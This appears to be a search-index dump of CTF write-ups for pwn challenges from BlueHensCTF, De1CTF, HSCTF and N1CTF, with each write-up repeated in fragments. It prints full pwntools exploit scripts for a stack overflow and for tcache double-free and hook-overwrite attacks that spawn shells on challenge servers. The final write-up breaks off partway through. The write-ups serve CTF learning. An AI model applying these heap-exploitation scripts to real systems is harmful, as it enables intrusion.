TamuCTF 21 tictactoe - SandraBino lottery - Shravya Bhaskara","title":"The contents of this repo"},{"location":"pwning/BlueHensCTF/beef-of-finitude/","text":"Beef_Of_Finitude To start off, we see a main function which calls function myFun. This functions takes in two inputs (strings), one as name and the other as password. An initial variable say var is defined and is equal to 7. i.e var = 0x7 as seen from line 22 in myFun. The first input and second inputs are 16 bytes long, however, if we look at line 103, we can see a 'push 0x150' command, which suggests that though the size for second input is 16 bytes, its taking 0x150 in total. This would mean that there is a chance to overflow the buffer to proceed to line 120, where the var value is compared with 0xdeadbeef and as we know var is stored at ebp-0xc as seen from line 22. Hence to satisfy the condition, we need to overflow the password in a way so that, var = 0xdeadbeef. To do that we may use the following code: from pwn import * r = remote('challenges.ctfd.io', 30027) r.recvuntil('Enter your Name:') r.sendline('shravya') r.recvuntil('Enter your password:') r.send('B'*26 + p32(0xdeadbeef)) r.interactive() Till here we have just overflown the buffer. This allows us into the shell but however to get the flag we may have to call the win() function. The gdb dump for the win() function is: 0x08049240 <+10>: sub esp,0x12c ; the stack size defined for win function is 0x12c or 300 bytes, whereas that for password input of myFun was 336 bytes. 0x08049246 <+16>: call 0x8049170 <__x86.get_pc_thunk.bx> ; which implies that we can overflow the buffer into yet another function, i.e the win() function. To do so, we will first have to fill the above stack with 336-300 = 36 bytes, since the win function accpets 4 arguments, 0x0804924b <+21>: add ebx,0x2db5 ; 0x08049251 <+27>: mov ecx,DWORD PTR [ebp+0x8] ; the following lines determine the 4 arguments to the win() function, 0x08049254 <+30>: mov DWORD PTR [ebp-0x130],ecx ; if ((((param_2 | param_1 ^ 0x14b4da55) == 0) && ((param_3 ^ 0x67616c66 | param_4) == 0))) 0x0804925a <+36>: mov ecx,DWORD PTR [ebp+0xc] ; thus param_2 = 0; param_1 = 0x14b4da55 and param_3 = 0; param_4 = 0x67616c66 0x0804925d <+39>: mov DWORD PTR [ebp-0x12c],ecx 0x08049263 <+45>: mov ecx,DWORD PTR [ebp+0x10] 0x08049266 <+48>: mov DWORD PTR [ebp-0x138],ecx 0x0804926c <+54>: mov ecx,DWORD PTR [ebp+0x14] 0x0804926f <+57>: mov DWORD PTR [ebp-0x134],ecx 0x08049275 <+63>: mov ecx,DWORD PTR [ebp-0x130] 0x0804927b <+69>: xor ecx,0x14b4da55 0x08049281 <+75>: mov esi,ecx 0x08049283 <+77>: mov ecx,DWORD PTR [ebp-0x12c] 0x08049289 <+83>: xor ch,0x0 0x0804928c <+86>: mov edi,ecx 0x0804928e <+88>: mov ecx,edi 0x08049290 <+90>: or ecx,esi 0x08049292 <+92>: test ecx,ecx 0x08049294 <+94>: jne 0x80492c0 <win+138> 0x08049296 <+96>: mov ecx,DWORD PTR [ebp-0x138] 0x0804929c <+102>: xor ecx,0x67616c66 Thus in order to overflow the buffer at the password, and to call the win() function once the right value is compared at ebp-0xc register, we will have to: 1. rewrite ebp-0xc with p32(0xdeadbeef) since that is what it is compared with, 2. rewrite the return address stored at eip to that of the win function, 3. pass arguments of win function, i.e param_1 = p32(0x14b4da55), param_2 = p32(0x0), param_3 = p32(0x67616c66), param_4 = p32(0x0) python program : (cotinuation) ``` from pwn import * r = remote('challenges.ctfd.io', 30027) r.recvuntil('Enter your Name:') r.sendline('hi') r.recvuntil('Enter your password:') r.sendline('B' 26 + p32(0xdeadbeef) + 'B' 12 + p32(0x0804923a) + p32(0x0804923a) + p32(0x14b4da55) + p32(0x0) + p32(0x67616c66) + p32(0x0)) r.interactive() ``` Flag: UDCTF{0bl1g4t0ry_buff3r_ov3rflow}","title":"Beef_Of_Finitude"},{"location":"pwning/BlueHensCTF/beef-of-finitude/#beef_of_finitude","text":"To start off, we see a main function which calls function myFun. This functions takes in two inputs (strings), one as name and the other as password. An initial variable say var is defined and is equal to 7. i.e var = 0x7 as seen from line 22 in myFun. The first input and second inputs are 16 bytes long, however, if we look at line 103, we can see a 'push 0x150' command, which suggests that though the size for second input is 16 bytes, its taking 0x150 in total. This would mean that there is a chance to overflow the buffer to proceed to line 120, where the var value is compared with 0xdeadbeef and as we know var is stored at ebp-0xc as seen from line 22. Hence to satisfy the condition, we need to overflow the password in a way so that, var = 0xdeadbeef. To do that we may use the following code: from pwn import * r = remote('challenges.ctfd.io', 30027) r.recvuntil('Enter your Name:') r.sendline('shravya') r.recvuntil('Enter your password:') r.send('B'*26 + p32(0xdeadbeef)) r.interactive() Till here we have just overflown the buffer. This allows us into the shell but however to get the flag we may have to call the win() function.","title":"Beef_Of_Finitude"},{"location":"pwning/BlueHensCTF/beef-of-finitude/#the-gdb-dump-for-the-win-function-is","text":"0x08049240 <+10>: sub esp,0x12c ; the stack size defined for win function is 0x12c or 300 bytes, whereas that for password input of myFun was 336 bytes. 0x08049246 <+16>: call 0x8049170 <__x86.get_pc_thunk.bx> ; which implies that we can overflow the buffer into yet another function, i.e the win() function. To do so, we will first have to fill the above stack with 336-300 = 36 bytes, since the win function accpets 4 arguments, 0x0804924b <+21>: add ebx,0x2db5 ; 0x08049251 <+27>: mov ecx,DWORD PTR [ebp+0x8] ; the following lines determine the 4 arguments to the win() function, 0x08049254 <+30>: mov DWORD PTR [ebp-0x130],ecx ; if ((((param_2 | param_1 ^ 0x14b4da55) == 0) && ((param_3 ^ 0x67616c66 | param_4) == 0))) 0x0804925a <+36>: mov ecx,DWORD PTR [ebp+0xc] ; thus param_2 = 0; param_1 = 0x14b4da55 and param_3 = 0; param_4 = 0x67616c66 0x0804925d <+39>: mov DWORD PTR [ebp-0x12c],ecx 0x08049263 <+45>: mov ecx,DWORD PTR [ebp+0x10] 0x08049266 <+48>: mov DWORD PTR [ebp-0x138],ecx 0x0804926c <+54>: mov ecx,DWORD PTR [ebp+0x14] 0x0804926f <+57>: mov DWORD PTR [ebp-0x134],ecx 0x08049275 <+63>: mov ecx,DWORD PTR [ebp-0x130] 0x0804927b <+69>: xor ecx,0x14b4da55 0x08049281 <+75>: mov esi,ecx 0x08049283 <+77>: mov ecx,DWORD PTR [ebp-0x12c] 0x08049289 <+83>: xor ch,0x0 0x0804928c <+86>: mov edi,ecx 0x0804928e <+88>: mov ecx,edi 0x08049290 <+90>: or ecx,esi 0x08049292 <+92>: test ecx,ecx 0x08049294 <+94>: jne 0x80492c0 <win+138> 0x08049296 <+96>: mov ecx,DWORD PTR [ebp-0x138] 0x0804929c <+102>: xor ecx,0x67616c66 Thus in order to overflow the buffer at the password, and to call the win() function once the right value is compared at ebp-0xc register, we will have to: 1. rewrite ebp-0xc with p32(0xdeadbeef) since that is what it is compared with, 2. rewrite the return address stored at eip to that of the win function, 3. pass arguments of win function, i.e param_1 = p32(0x14b4da55), param_2 = p32(0x0), param_3 = p32(0x67616c66), param_4 = p32(0x0)","title":"The gdb dump for the win() function is:"},{"location":"pwning/BlueHensCTF/beef-of-finitude/#python-program-cotinuation","text":"``` from pwn import * r = remote('challenges.ctfd.io', 30027) r.recvuntil('Enter your Name:') r.sendline('hi') r.recvuntil('Enter your password:') r.sendline('B' 26 + p32(0xdeadbeef) + 'B' 12 + p32(0x0804923a) + p32(0x0804923a) + p32(0x14b4da55) + p32(0x0) + p32(0x67616c66) + p32(0x0)) r.interactive() ```","title":"python program : (cotinuation)"},{"location":"pwning/BlueHensCTF/beef-of-finitude/#flag-udctf0bl1g4t0ry_buff3r_ov3rflow","text":"","title":"Flag: UDCTF{0bl1g4t0ry_buff3r_ov3rflow}"},{"location":"pwning/De1CTF20/stl/","text":"STL_Container Solved by: Shruti (@rudyerudite) De1CTF had very interesting Pwn and RE challenges but I could only find time to attempt two: STL_Container and Parser of either categories respectively. Here\u2019s a short writeup on a how I solved the former during the CTF. This is a simple challenge for learning and exploiting Tcache. To get the initial click, we run a checksec.sh on the binary and find that all the mitigations are enabled except that RELRO is partial. It\u2019s a 64-bit non-stripped binary which requires libc 2.27. Let\u2019s checkout the typical menu of every heap challenge: STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit >> 1 1. add 2. delete 3. show >> 1 input data:aaa done! STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit >> So CPP program presents us with 3 in built data structures of the most reliable STL library. Stack and queue make use of deque, list makes use of doubly linked list and vector uses a vector. I started out by allocating all the different data structures and found out that one could allocate only 2 nodes in each of the data structures. The allocation of each of these is done on the heap and and makes a fixed allocation of 0x98 bytes for each node. It reads in 0x98 bytes of data. Taking all these into account, there could be a possibility of overwriting free_hook with a one_gadget ( as a shortcut to erstwhile overwriting with system). As the allocation was done using malloc one could get it easily by simply allocating, deleting and printing the contents of the chunk. And we had all the 3 functionalities under our control- though printing was not supported for stack and queue. So I started off by allocating chunks and then deleting them one by one. What I noticed was when deleting vector I got a double free! Which implies there was a chunk pointing to itself in the tcache. That\u2019s why I was able to allocate only 7 chunks. Getting the Leaks I got the heap leaks by simply allocating the chunk which had pointers to the next chunk in the list. After that I called the print functionality. Hmmm\u2026 I\u2019d a heap in the unsorted bin which I\u2019d to allocate and print the contents. But because of the double free and also weird functionality of the code (copy content of a chunk to another and then delete the previous) I was not able to do it so easily. I created a list node and was allocated on the heap. This is how a structure of a node (in list) looked like: 0x5555555455000000: heap_addr_of_next_node heap_addr_of_prev_node 0x5555555455000010: heap_addr_of_the_stored_content I simply allocated one of the freed vector chunks and overwrote the next pointer to the heap address of the stored content. Then on the next allocation the naive tcache gave me the liberty to overwrite the address 0x5555555455000010 with the address of the chunk in the unsorted bin. I did so to make use of the print functionality so that I could simply print out the contents of the list node which I had previously created. But yes the contents printed out weren\u2019t the earlier contents :). That\u2019s how I got the libc leak! Final Exploit I created 2 vectors and deleted them to get a similar double free but this time overwrote next pointer with free_hook with a one_gadget and called a free using delete. Running the code swiftly popped up the much anticipated shell! Here\u2019s the final exploit for the code, mind you it\u2019s not the most optimized code and there could be better ways of solving it. It might be a little confusing to understand, so better get your hands dirty on the binary and try out the exploit yourself! from pwn import * #r = process('./stl_container') r = remote('206.189.186.98',18848) def callds(ds,opt,value,idx): r.sendlineafter(\">>\",str(ds)) r.sendlineafter(\">>\",str(opt)) if(opt == 1): r.sendlineafter(\"input data:\",value) print(r.recvline()) else: if((ds == 3 or ds == 4) and opt == 2): return r.sendlineafter(\"index?\\n\",str(idx)) if(ds ==2): print(\"lol\") print(r.recvline()) #payload = p64(0x0)+p64(0x91)+'a'*(0xa0-0x20)+p64(0x90) #adding chunks to tcache callds(1,1,'a'*0x10,-1) callds(1,1,'b'*0x10,-1) callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(3,1,'e'*0x10,-1) callds(3,1,'f'*0x10,-1) callds(4,1,'g'*0x10,-1) payload = p64(0xa1)*0x6 + p64(0x0) callds(4,1,payload,-1) #deleting chunks; unsorted bin callds(1,2,-1,0) callds(1,2,-1,1) callds(2,2,-1,0) callds(2,2,-1,0) callds(3,2,-1,0) callds(3,2,-1,1) callds(4,2,-1,0) callds(4,2,-1,1) #getting heap leaks callds(1,1,'',-1) callds(1,3,'',1) print(r.recvline()) leak = u64((\"\\x70\"+r.recvline().strip()).ljust(8,'\\x00')) print(hex(leak)) #getting libc leaks chunk = p64(leak -0x3f0) callds(3,1,'',-1) callds(3,1,chunk,-1) callds(4,1,'/bin/sh',-1) payload = p64(leak+0xa0) callds(4,1,payload,-1) callds(1,3,'',0) leak = u64(r.recvline().strip().split(\": \")[1].ljust(8,'\\x00')) print(hex(leak)) libc_base = leak - 0x3ebca0 system = libc_base + 0x4f440 malloc_hook = libc_base + 0x3ebc30 free_hook = libc_base + 0x3ed8e8 one_gadget = libc_base + 0x4f322 #final overwrite callds(1,2,-1,0) callds(1,2,-1,0) callds(3,2,-1,0) #to cause a loop callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(2,2,-1,0) callds(2,2,-1,0) payload = p64(free_hook) callds(2,1,payload,-1) callds(3,1,p64(one_gadget),-1) #gdb.attach(r) r.interactive() ##De1CTF{NeuEr_u51ng_O6j3ct_1n_VecT0r}","title":"STL_Container"},{"location":"pwning/De1CTF20/stl/#stl_container","text":"Solved by: Shruti (@rudyerudite) De1CTF had very interesting Pwn and RE challenges but I could only find time to attempt two: STL_Container and Parser of either categories respectively. Here\u2019s a short writeup on a how I solved the former during the CTF. This is a simple challenge for learning and exploiting Tcache. To get the initial click, we run a checksec.sh on the binary and find that all the mitigations are enabled except that RELRO is partial. It\u2019s a 64-bit non-stripped binary which requires libc 2.27. Let\u2019s checkout the typical menu of every heap challenge: STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit >> 1 1. add 2. delete 3. show >> 1 input data:aaa done! STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit >> So CPP program presents us with 3 in built data structures of the most reliable STL library. Stack and queue make use of deque, list makes use of doubly linked list and vector uses a vector. I started out by allocating all the different data structures and found out that one could allocate only 2 nodes in each of the data structures. The allocation of each of these is done on the heap and and makes a fixed allocation of 0x98 bytes for each node. It reads in 0x98 bytes of data. Taking all these into account, there could be a possibility of overwriting free_hook with a one_gadget ( as a shortcut to erstwhile overwriting with system). As the allocation was done using malloc one could get it easily by simply allocating, deleting and printing the contents of the chunk. And we had all the 3 functionalities under our control- though printing was not supported for stack and queue. So I started off by allocating chunks and then deleting them one by one. What I noticed was when deleting vector I got a double free! Which implies there was a chunk pointing to itself in the tcache. That\u2019s why I was able to allocate only 7 chunks.","title":"STL_Container"},{"location":"pwning/De1CTF20/stl/#getting-the-leaks","text":"I got the heap leaks by simply allocating the chunk which had pointers to the next chunk in the list. After that I called the print functionality. Hmmm\u2026 I\u2019d a heap in the unsorted bin which I\u2019d to allocate and print the contents. But because of the double free and also weird functionality of the code (copy content of a chunk to another and then delete the previous) I was not able to do it so easily. I created a list node and was allocated on the heap. This is how a structure of a node (in list) looked like: 0x5555555455000000: heap_addr_of_next_node heap_addr_of_prev_node 0x5555555455000010: heap_addr_of_the_stored_content I simply allocated one of the freed vector chunks and overwrote the next pointer to the heap address of the stored content. Then on the next allocation the naive tcache gave me the liberty to overwrite the address 0x5555555455000010 with the address of the chunk in the unsorted bin. I did so to make use of the print functionality so that I could simply print out the contents of the list node which I had previously created. But yes the contents printed out weren\u2019t the earlier contents :). That\u2019s how I got the libc leak!","title":"Getting the Leaks"},{"location":"pwning/De1CTF20/stl/#final-exploit","text":"I created 2 vectors and deleted them to get a similar double free but this time overwrote next pointer with free_hook with a one_gadget and called a free using delete. Running the code swiftly popped up the much anticipated shell! Here\u2019s the final exploit for the code, mind you it\u2019s not the most optimized code and there could be better ways of solving it. It might be a little confusing to understand, so better get your hands dirty on the binary and try out the exploit yourself! from pwn import * #r = process('./stl_container') r = remote('206.189.186.98',18848) def callds(ds,opt,value,idx): r.sendlineafter(\">>\",str(ds)) r.sendlineafter(\">>\",str(opt)) if(opt == 1): r.sendlineafter(\"input data:\",value) print(r.recvline()) else: if((ds == 3 or ds == 4) and opt == 2): return r.sendlineafter(\"index?\\n\",str(idx)) if(ds ==2): print(\"lol\") print(r.recvline()) #payload = p64(0x0)+p64(0x91)+'a'*(0xa0-0x20)+p64(0x90) #adding chunks to tcache callds(1,1,'a'*0x10,-1) callds(1,1,'b'*0x10,-1) callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(3,1,'e'*0x10,-1) callds(3,1,'f'*0x10,-1) callds(4,1,'g'*0x10,-1) payload = p64(0xa1)*0x6 + p64(0x0) callds(4,1,payload,-1) #deleting chunks; unsorted bin callds(1,2,-1,0) callds(1,2,-1,1) callds(2,2,-1,0) callds(2,2,-1,0) callds(3,2,-1,0) callds(3,2,-1,1) callds(4,2,-1,0) callds(4,2,-1,1) #getting heap leaks callds(1,1,'',-1) callds(1,3,'',1) print(r.recvline()) leak = u64((\"\\x70\"+r.recvline().strip()).ljust(8,'\\x00')) print(hex(leak)) #getting libc leaks chunk = p64(leak -0x3f0) callds(3,1,'',-1) callds(3,1,chunk,-1) callds(4,1,'/bin/sh',-1) payload = p64(leak+0xa0) callds(4,1,payload,-1) callds(1,3,'',0) leak = u64(r.recvline().strip().split(\": \")[1].ljust(8,'\\x00')) print(hex(leak)) libc_base = leak - 0x3ebca0 system = libc_base + 0x4f440 malloc_hook = libc_base + 0x3ebc30 free_hook = libc_base + 0x3ed8e8 one_gadget = libc_base + 0x4f322 #final overwrite callds(1,2,-1,0) callds(1,2,-1,0) callds(3,2,-1,0) #to cause a loop callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(2,2,-1,0) callds(2,2,-1,0) payload = p64(free_hook) callds(2,1,payload,-1) callds(3,1,p64(one_gadget),-1) #gdb.attach(r) r.interactive() ##De1CTF{NeuEr_u51ng_O6j3ct_1n_VecT0r}","title":"Final Exploit"},{"location":"pwning/HSCTF20/studysim/","text":"Studysim This was a fun challenge on the vulnerable Tcache bins but different one compared to the simple FD overwrites one would expect. So let\u2019s check it out! Along, with the challenge binary we were provided with Glibc 2.29 and loader for it. You can possibly use patchelf tool if your local environment is not of the one required for the challenge, so that your binary loads the Glibc 2.29 libc and the required loader for it. Carrying out the initial checksec step, we get the following information on the mitigations: Canary : Yes NX : Yes PIE : No Fortify : No RelRO : Full So possibly some overwrite on any of the hooks? A possible FSOP? Let\u2019s explore! The menu function which we are presented with: Welcome to study simulator! Because who has free time when you must STUDY. Commands: add - Adds a worksheet onto your stack of worksheets do - Complete the top worksheets sleep - Give up and sleep > Add Let\u2019s us create a new chunk of any size below 0x400 and then the allocated chunk\u2019s address is then stored in an array called stack in .bss section. If the count of the chunks is already 7 then we cannot store anymore chunks but otherwise it simply increments the count variable. stack[allocated_count ++] = address of the allocated chunk After this we can give some content and it prints back the content which we have just added. Do Here comes the vulnerable part. The function asks the user to input any number of integer and reduces the value of allocated_count by that much value without any checks on the input value. Which means using this we can store our return allocated address anywhere on the .bss. This is how the .bss section looks like: 0x404020 <stdout@@GLIBC_2.2.5>: 0x00007ffff7fc6760 0x0000000000000000 0x404030 <stdin@@GLIBC_2.2.5>: 0x00007ffff7fc5a00 0x0000000000000000 0x404040 <allocated_count>: 0x0000000000000000 0x0000000000000000 0x404050: 0x0000000000000000 0x0000000000000000 0x404060 <stack>: 0x0000000000000000 0x0000000000000000 0x404070 <stack+16>: 0x0000000000000000 0x0000000000000000 0x404080 <stack+32>: 0x0000000000000000 0x0000000000000000 0x404090 <stack+48>: 0x0000000000000000 0x0000000000000000 Sleep Well, it just sleeps and exits. Nothing interesting here. Getting the Leaks To get the heap leaks, we can invoke the Do() functionality and then reduce the allocated_count to a negative value such that the address of the heap chunk returned by the malloc function is stored on the allocated_count .bss address. As the binary prints out the value of allocated_count here we get the heap leaks. You throw the worksheet '0@@' on your stack of worksheets. > For the libc leaks, well it won\u2019t be that easy as there\u2019s a size check and also no free() to invoke anywhere anyhow. As the libc addresses are stored on the .bss section we need to somehow get an allocation there (as the binary prints the content of the chunk). So now how do we control this? Here, comes the Tcache structure. I found this really good reference for understanding about how the Tcache keeps a track of the number of chunks in Tcache and their addresses. I won\u2019t be explaining it in detail; you can check out the resource mentioned and try checking out the structure in GDB by allocating and freeing chunks in Tcache for any program which allows you to do it. By calculating the right offset with the heap leaks and the known .bss address of the array stack one can get the allocation in the Tcache structure ( using the Do() functionality again ofc). First, we can overwrite the first 8 bytes of tcache_perthread_struct.count. And then similarly on the next allocation we can overwrite the first pointer stored in tcache_perthread_struct.entries (such that it acts as a freed chunk of size of 0x20 bytes). This pointer must have the .bss address of stdout_GLIBC stored as it\u2019s forward pointer. So on the next call on malloc you can get an allocation there and cleverly leak out the libc address stored! 0x1553000: 0x0000000000000000 0x0000000000000251 <-- Tcache struct begins 0x1553010: 0x000000000155327f 0x0000000000000000 <-- First 8 bytes overwritten with count 0x1553020: 0x0000000000000000 0x0000000000000000 0x1553030: 0x0000000000000000 0x0000000000000000 0x1553040: 0x0000000000000000 0x0000000000000000 0x1553050: 0x0000000000404030 0x0000000000000000 <-- Next chunk in line for allocation 0x1553060: 0x0000000000000000 0x0000000000000000 Final Exploit By using the same trick as for the libc leaks, we can trigger the final exploit. Like last time by cleverly getting an allocation on Tcache (probably a chunk of another size, as it might give SIGSEV) of a chunk with FD pointer set to malloc_hook . On the next call to malloc() function we would get an allocation on malloc_hook (exploiting the naive tcache). Now you can simply overwrite it with a one_gadget and on next malloc KABOOM!!! from pwn import * bss_stack = 0x404060 #k = process(\"./studysim\",env = {\"LD_PRELOAD\" : \"./libc.so.6\"}) k = remote('pwn.hsctf.com', 5007) def add(size,content): k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",str(size)) k.sendlineafter(\"worksheet?\\n\",content) def do(count): k.sendlineafter(\"> \",\"do\") k.sendlineafter(\"finish?\\n\",str(count)) def sleep(): k.sendlineafter(\"> \",\"sleep\") stdout_bss = 0x0000000000404030 #heap leaks do(4) add(0x10,'a'*0x10) do(0) k.recvuntil(\"Only \") heap_leak = int(k.recvline().strip().split(\" \")[0],10)-1 print(hex(heap_leak)) do(heap_leak) #get a count chunk = heap_leak-0x250-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x10,'c'*0x10) do(diff/8+1) #allocate a chunk at .bss addr of stdin chunk = heap_leak-0x208-0x10 diff = -bss_stack+chunk do(-diff/8) add(0x10,p64(stdout_bss)) do(diff/8+1) add(0x08,'') k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",str(0x8)) k.sendlineafter(\"worksheet?\\n\",'a') k.recvuntil(\"worksheet \") leak = k.recvline().strip().split(\" \")[0].replace(\"'\",\"\") leak = '\\x00'+leak[1:] leak = u64(leak.ljust(8,'\\x00')) libc_base = leak-0x1e4a00 print(hex(libc_base)) do(3) #allocate chunk at __malloc_hook malloc_hook = libc_base + 0x0000000001e4c30 system = libc_base + 0x0000000000052fd0 one_gadget = libc_base + 0xe2383 chunk = heap_leak-0x208-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x20,p64(malloc_hook)) do(diff/8+1) add(0x08,'') k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",str(0x8)) k.sendlineafter(\"worksheet?\\n\",p64(one_gadget)) do(2) #call system k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",'0') k.interactive()","title":"Studysim"},{"location":"pwning/HSCTF20/studysim/#studysim","text":"This was a fun challenge on the vulnerable Tcache bins but different one compared to the simple FD overwrites one would expect. So let\u2019s check it out! Along, with the challenge binary we were provided with Glibc 2.29 and loader for it. You can possibly use patchelf tool if your local environment is not of the one required for the challenge, so that your binary loads the Glibc 2.29 libc and the required loader for it. Carrying out the initial checksec step, we get the following information on the mitigations: Canary : Yes NX : Yes PIE : No Fortify : No RelRO : Full So possibly some overwrite on any of the hooks? A possible FSOP? Let\u2019s explore! The menu function which we are presented with: Welcome to study simulator! Because who has free time when you must STUDY. Commands: add - Adds a worksheet onto your stack of worksheets do - Complete the top worksheets sleep - Give up and sleep >","title":"Studysim"},{"location":"pwning/HSCTF20/studysim/#add","text":"Let\u2019s us create a new chunk of any size below 0x400 and then the allocated chunk\u2019s address is then stored in an array called stack in .bss section. If the count of the chunks is already 7 then we cannot store anymore chunks but otherwise it simply increments the count variable. stack[allocated_count ++] = address of the allocated chunk After this we can give some content and it prints back the content which we have just added.","title":"Add"},{"location":"pwning/HSCTF20/studysim/#do","text":"Here comes the vulnerable part. The function asks the user to input any number of integer and reduces the value of allocated_count by that much value without any checks on the input value. Which means using this we can store our return allocated address anywhere on the .bss. This is how the .bss section looks like: 0x404020 <stdout@@GLIBC_2.2.5>: 0x00007ffff7fc6760 0x0000000000000000 0x404030 <stdin@@GLIBC_2.2.5>: 0x00007ffff7fc5a00 0x0000000000000000 0x404040 <allocated_count>: 0x0000000000000000 0x0000000000000000 0x404050: 0x0000000000000000 0x0000000000000000 0x404060 <stack>: 0x0000000000000000 0x0000000000000000 0x404070 <stack+16>: 0x0000000000000000 0x0000000000000000 0x404080 <stack+32>: 0x0000000000000000 0x0000000000000000 0x404090 <stack+48>: 0x0000000000000000 0x0000000000000000","title":"Do"},{"location":"pwning/HSCTF20/studysim/#sleep","text":"Well, it just sleeps and exits. Nothing interesting here.","title":"Sleep"},{"location":"pwning/HSCTF20/studysim/#getting-the-leaks","text":"To get the heap leaks, we can invoke the Do() functionality and then reduce the allocated_count to a negative value such that the address of the heap chunk returned by the malloc function is stored on the allocated_count .bss address. As the binary prints out the value of allocated_count here we get the heap leaks. You throw the worksheet '0@@' on your stack of worksheets. > For the libc leaks, well it won\u2019t be that easy as there\u2019s a size check and also no free() to invoke anywhere anyhow. As the libc addresses are stored on the .bss section we need to somehow get an allocation there (as the binary prints the content of the chunk). So now how do we control this? Here, comes the Tcache structure. I found this really good reference for understanding about how the Tcache keeps a track of the number of chunks in Tcache and their addresses. I won\u2019t be explaining it in detail; you can check out the resource mentioned and try checking out the structure in GDB by allocating and freeing chunks in Tcache for any program which allows you to do it. By calculating the right offset with the heap leaks and the known .bss address of the array stack one can get the allocation in the Tcache structure ( using the Do() functionality again ofc). First, we can overwrite the first 8 bytes of tcache_perthread_struct.count. And then similarly on the next allocation we can overwrite the first pointer stored in tcache_perthread_struct.entries (such that it acts as a freed chunk of size of 0x20 bytes). This pointer must have the .bss address of stdout_GLIBC stored as it\u2019s forward pointer. So on the next call on malloc you can get an allocation there and cleverly leak out the libc address stored! 0x1553000: 0x0000000000000000 0x0000000000000251 <-- Tcache struct begins 0x1553010: 0x000000000155327f 0x0000000000000000 <-- First 8 bytes overwritten with count 0x1553020: 0x0000000000000000 0x0000000000000000 0x1553030: 0x0000000000000000 0x0000000000000000 0x1553040: 0x0000000000000000 0x0000000000000000 0x1553050: 0x0000000000404030 0x0000000000000000 <-- Next chunk in line for allocation 0x1553060: 0x0000000000000000 0x0000000000000000","title":"Getting the Leaks"},{"location":"pwning/HSCTF20/studysim/#final-exploit","text":"By using the same trick as for the libc leaks, we can trigger the final exploit. Like last time by cleverly getting an allocation on Tcache (probably a chunk of another size, as it might give SIGSEV) of a chunk with FD pointer set to malloc_hook . On the next call to malloc() function we would get an allocation on malloc_hook (exploiting the naive tcache). Now you can simply overwrite it with a one_gadget and on next malloc KABOOM!!! from pwn import * bss_stack = 0x404060 #k = process(\"./studysim\",env = {\"LD_PRELOAD\" : \"./libc.so.6\"}) k = remote('pwn.hsctf.com', 5007) def add(size,content): k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",str(size)) k.sendlineafter(\"worksheet?\\n\",content) def do(count): k.sendlineafter(\"> \",\"do\") k.sendlineafter(\"finish?\\n\",str(count)) def sleep(): k.sendlineafter(\"> \",\"sleep\") stdout_bss = 0x0000000000404030 #heap leaks do(4) add(0x10,'a'*0x10) do(0) k.recvuntil(\"Only \") heap_leak = int(k.recvline().strip().split(\" \")[0],10)-1 print(hex(heap_leak)) do(heap_leak) #get a count chunk = heap_leak-0x250-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x10,'c'*0x10) do(diff/8+1) #allocate a chunk at .bss addr of stdin chunk = heap_leak-0x208-0x10 diff = -bss_stack+chunk do(-diff/8) add(0x10,p64(stdout_bss)) do(diff/8+1) add(0x08,'') k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",str(0x8)) k.sendlineafter(\"worksheet?\\n\",'a') k.recvuntil(\"worksheet \") leak = k.recvline().strip().split(\" \")[0].replace(\"'\",\"\") leak = '\\x00'+leak[1:] leak = u64(leak.ljust(8,'\\x00')) libc_base = leak-0x1e4a00 print(hex(libc_base)) do(3) #allocate chunk at __malloc_hook malloc_hook = libc_base + 0x0000000001e4c30 system = libc_base + 0x0000000000052fd0 one_gadget = libc_base + 0xe2383 chunk = heap_leak-0x208-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x20,p64(malloc_hook)) do(diff/8+1) add(0x08,'') k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",str(0x8)) k.sendlineafter(\"worksheet?\\n\",p64(one_gadget)) do(2) #call system k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",'0') k.interactive()","title":"Final Exploit"},{"location":"pwning/N1CTF20/easywrite/","text":"EasyWrite The past weekend I played N1CTF along with my teammates, I ended up spending most of the time in EasyWrite and Signin. In this writeup I\u2019ll be explaining about my approach for the EasyWrite, so let\u2019s get started! Initial Click All the useful mitigation are enabled other than FORTIFY. Also, the libc version required is libc-2.31. In a nutshell, the binary does the follows: Gives us the libc leak directly We can input 0x299 bytes which is stored on the heap [chunk1] Asks us to enter an address [addr1] where contents of chunk1 are copied to Allocated a chunk of size 0x30 [chunk2]. We can write 0x2f bytes to this chunk. chunk2 is freed. From this I could deduce that overwriting free_hook could be the key. But it wasn\u2019t really that easy. What did not work? On the first try, I gave addr1 as free_hook_ and the contents of chunk1 as address of system/ shellcode what not. I ended up with a SIGSEV because this was bound not to work as the binary was executing the chunk1 address and NX was enabled. I couldn\u2019t find any other targets for a long while. Another thing to try out was the controlling tcache structure because we could utilize the write happening on chunk2. Basically, we had to control malloc to help us in getting an arbitrary write. How about getting an allocation on free_hook_ and then overwriting it to get a shell? Not that easy. Crux: Controlling Tcache We know that it\u2019s the tcache_perthread_struct (stored on the heap) which kind of keeps a track of the count of chunks are present in the bin and also which one to be recycled on the next call. But in the present scenario we cannot control it because we do not have any way to get heap leaks but we have the libc leaks. Is there any way to control this region if we are armed only with libc leaks? I found a mmap\u2019d address which stores the pointer to the [tcache_perthread structure] -0x10 address. If we could overwrite this address with a chunk1 which has our fake tcache_structure (where the next 0x30 size chunk to be recycled is our free_hook_) then we could get the desired arbitrary write. In my understanding this mmap region is the global Tcache pointer which stores the pointer to the tcache structure (one stored on heap). More details can be found on another writeup on the same which gives a detailed understanding: https://ctftime.org/writeup/24295 . What happened next? 